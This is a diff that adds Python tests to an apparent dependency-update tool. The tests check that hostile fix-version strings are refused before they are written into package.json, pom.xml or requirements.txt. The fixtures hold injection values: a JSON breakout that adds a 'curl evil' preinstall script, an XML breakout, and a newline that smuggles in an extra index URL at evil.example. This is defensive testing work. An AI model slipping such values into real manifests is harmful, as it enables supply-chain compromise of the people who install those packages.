@@ -1360,3 +1360,115 @@ def test_rewrite_package_json_case_sibling_alias_not_bumped(
     assert applied is False
     assert new_text == text
     assert reason == "no matching spec found"
+
+
+# ---------------------------------------------------------------------------
+# Untrusted fix-version grammar gate — local-rewriter chokepoint
+# ---------------------------------------------------------------------------
+
+def _hostile_plan(manifest: str, ecosystem: str, name: str,
+                  installed: str, target: str) -> update._PlanEntry:
+    return update._PlanEntry(
+        ecosystem=ecosystem, name=name, installed=installed,
+        target=target, manifest=Path(manifest), advisory_ids=["GHSA-x"],
+    )
+
+
+def test_hostile_target_refused_for_package_json() -> None:
+    """A fixed_version carrying a JSON-string breakout must never be
+    spliced between package.json quotes (install-script injection)."""
+    payload = '4.17.21", "scripts": {"preinstall": "curl evil"'
+    text = json.dumps({"dependencies": {"lodash": "^4.17.19"}}, indent=2)
+    plan = _hostile_plan("package.json", "npm", "lodash",
+                         "4.17.19", payload)
+    new_text, applied, reason = update._rewrite_one(
+        Path("package.json"), text, plan)
+    assert applied is False
+    assert new_text == text
+    assert "preinstall" not in new_text
+    assert reason is not None and reason.startswith("refused")
+    # The refusal reason is rendered into operator markdown/stdout —
+    # it must carry no raw newline or unescaped backtick/pipe.
+    assert "\n" not in reason
+
+
+def test_hostile_target_refused_for_pom_xml() -> None:
+    payload = "2.17.1</version></dependency><dependency>evil"
+    text = (
+        "<project><dependencies><dependency>"
+        "<groupId>org.apache.logging.log4j</groupId>"
+        "<artifactId>log4j-core</artifactId>"
+        "<version>2.14.1</version>"
+        "</dependency></dependencies></project>"
+    )
+    plan = _hostile_plan(
+        "pom.xml", "Maven", "org.apache.logging.log4j:log4j-core",
+        "2.14.1", payload)
+    new_text, applied, reason = update._rewrite_one(
+        Path("pom.xml"), text, plan)
+    assert applied is False
+    assert new_text == text
+    assert "</version></dependency>" not in payload or "evil" not in new_text
+    assert reason is not None and reason.startswith("refused")
+
+
+def test_hostile_target_refused_for_requirements_txt() -> None:
+    payload = "2.28.0\n--extra-index-url https://evil.example/simple"
+    text = "requests==2.27.0\n"
+    plan = _hostile_plan("requirements.txt", "PyPI", "requests",
+                         "2.27.0", payload)
+    new_text, applied, reason = update._rewrite_one(
+        Path("requirements.txt"), text, plan)
+    assert applied is False
+    assert new_text == text
+    assert "--extra-index-url" not in new_text
+    assert reason is not None and reason.startswith("refused")
+
+
+def test_plain_version_targets_still_rewrite() -> None:
+    """Positive direction: the gate admits ordinary version literals
+    (including build metadata / pre-release shapes)."""
+    text = json.dumps({"dependencies": {"lodash": "^4.17.19"}}, indent=2)
+    plan = _hostile_plan("package.json", "npm", "lodash",
+                         "4.17.19", "4.17.21")
+    new_text, applied, reason = update._rewrite_one(
+        Path("package.json"), text, plan)
+    assert applied is True and "^4.17.21" in new_text
+    req = "requests==2.27.0\n"
+    plan2 = _hostile_plan("requirements.txt", "PyPI", "requests",
+                          "2.27.0", "2.28.0rc1")
+    new_req, applied2, _ = update._rewrite_one(
+        Path("requirements.txt"), req, plan2)
+    assert applied2 is True and "2.28.0rc1" in new_req
+
+
+def test_optimise_bare_pin_refuses_hostile_target() -> None:
+    """The bare-name pin fallback is the one rewrite entry point not
+    routed through _rewrite_one — it must apply the same gate (it runs
+    exactly when _rewrite_one declined, including gate declines)."""
+    from packages.sca import optimise
+    payload = '1.0.0", "scripts": {"preinstall": "curl evil"'
+    text = json.dumps({"dependencies": {"left-pad": "*"}}, indent=2)
+    plan = _hostile_plan("package.json", "npm", "left-pad",
+                         "1.0.0", payload)
+    new_text, applied, reason = optimise._pin_bare_name(
+        Path("package.json"), text, plan)
+    assert applied is False
+    assert new_text == text
+    assert reason is not None and reason.startswith("refused")
+
+
+def test_dpkg_epoch_and_tilde_targets_pass_gate() -> None:
+    """Debian epoch (``4:12.2.0-3``) and tilde (``1.0~rc1``) versions
+    are legitimate upgrade targets — the gate must admit them while
+    still refusing splice shapes that merely CONTAIN a colon."""
+    plan = _hostile_plan("requirements.txt", "Debian", "nginx",
+                         "1.22.1-9", "4:12.2.0-3")
+    assert update.refuse_unsafe_target(plan) is None
+    plan_tilde = _hostile_plan("requirements.txt", "Debian", "nginx",
+                               "1.22.1-9", "1.0~rc1+deb12u1")
+    assert update.refuse_unsafe_target(plan_tilde) is None
+    for bad in ('4:12","scripts":{}', "4:12\n--evil", "4:12 <x>", ":leading"):
+        p = _hostile_plan("requirements.txt", "Debian", "nginx",
+                          "1.22.1-9", bad)
+        assert update.refuse_unsafe_target(p) is not None
